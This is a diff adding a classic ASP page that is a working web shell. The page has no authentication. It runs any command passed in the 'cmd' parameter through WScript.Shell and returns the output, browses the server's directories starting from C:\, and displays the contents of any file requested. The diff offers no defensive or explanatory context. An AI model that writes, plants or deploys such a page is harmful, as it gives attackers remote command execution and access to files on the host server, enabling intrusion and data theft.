@@ -1,0 +1,73 @@
+<html><body>
+<%
+file = request("file")
+tipo = request("type")
+cmd = request("cmd")
+
+If file = "" Then
+    file = "C:\"
+    tipo = "1"
+End If
+%>
+
+<form method="GET">
+    <input type="text" name="file" value="<%=file%>">
+    <input type="hidden" name="type" value="<%=tipo%>">
+    <input type="submit" value="Browse">
+</form>
+
+<form method="GET">
+    <input type="text" name="cmd" placeholder="Command e.g. whoami" style="width:300px;">
+    <input type="submit" value="Execute">
+</form>
+
+<%
+' ---- Command Execution ----
+If cmd <> "" Then
+    Response.Write("<h3>Command Output:</h3><pre>")
+    Set oShell = Server.CreateObject("WScript.Shell")
+    Set oExec = oShell.Exec("cmd /c " & cmd)
+    Do While Not oExec.StdOut.AtEndOfStream
+        Response.Write(Server.HTMLEncode(oExec.StdOut.ReadLine()) & vbCrLf)
+    Loop
+    Response.Write("</pre><hr>")
+End If
+
+' ---- Directory listing ----
+If tipo = "1" Then
+    Response.Write("<h3>PATH: " & file & "</h3>")
+    ListFolder(file)
+End If
+
+' ---- File content viewer ----
+If tipo = "2" Then
+    Response.Write("<h3>FILE: " & file & "</h3>")
+    Set oStr = Server.CreateObject("Scripting.FileSystemObject")
+    If oStr.FileExists(file) Then
+        Set oFich = oStr.OpenTextFile(file, 1)
+        Response.Write("<pre>" & Server.HTMLEncode(oFich.ReadAll) & "</pre>")
+    Else
+        Response.Write("<pre>File not found.</pre>")
+    End If
+End If
+
+' ---- Subroutine: Directory Listing ----
+Sub ListFolder(path)
+    Set fs = CreateObject("Scripting.FileSystemObject")
+    Set folder = fs.GetFolder(path)
+
+    Response.Write("<ul>")
+    Response.Write("<li><a href='?type=1&file=" & Server.URLEncode(path & "..\") & "'>[Parent Directory]</a></li>")
+    
+    For Each subfolder In folder.SubFolders
+        Response.Write("<li><a href='?type=1&file=" & Server.URLEncode(subfolder.Path & "\") & "'>[DIR] " & subfolder.Name & "</a></li>")
+    Next
+
+    For Each fileitem In folder.Files
+        Response.Write("<li><a href='?type=2&file=" & Server.URLEncode(fileitem.Path) & "'>" & fileitem.Name & "</a> - " & fileitem.Size & " bytes</li>")
+    Next
+
+    Response.Write("</ul>")
+End Sub
+%>
+</body></html>
